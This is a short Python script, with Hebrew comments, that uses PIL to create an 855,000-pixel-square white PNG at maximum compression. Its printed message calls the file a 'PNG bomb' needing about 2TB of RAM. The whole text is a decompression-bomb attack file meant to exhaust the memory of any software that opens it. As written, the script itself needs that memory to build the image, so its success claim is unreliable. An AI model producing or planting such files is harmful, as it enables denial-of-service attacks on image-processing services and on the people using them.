from PIL import Image

width = height = 855000  # אותו גודל

img = Image.new('RGB', (width, height), color='white')
img.save('png_bomb_2tb.png', compress_level=9)

print("✅ נוצרה פצצת PNG שתדרוש ~2TB RAM")